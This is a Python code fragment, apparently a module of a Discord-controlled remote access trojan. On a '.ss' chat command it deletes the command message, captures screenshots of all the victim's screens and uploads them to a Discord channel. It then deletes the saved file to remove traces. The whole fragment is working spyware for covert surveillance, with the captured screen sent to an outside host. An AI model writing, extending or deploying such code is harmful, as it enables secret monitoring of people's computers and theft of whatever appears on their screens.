from resources.misc import *
from PIL import ImageGrab
import subprocess
# end of imports

# on message
elif message.content == '.ss':
    #.log Message is "take screenshot"
    await message.delete()
    #.log Removed the message
    ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
    #.log Saved a screenshot of this PCs screen
    reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
    #.log Sent embed containing screenshot
    await reaction_msg.add_reaction('📌')
    #.log Reacted with "pin"

    subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
    #.log Removed the screenshot
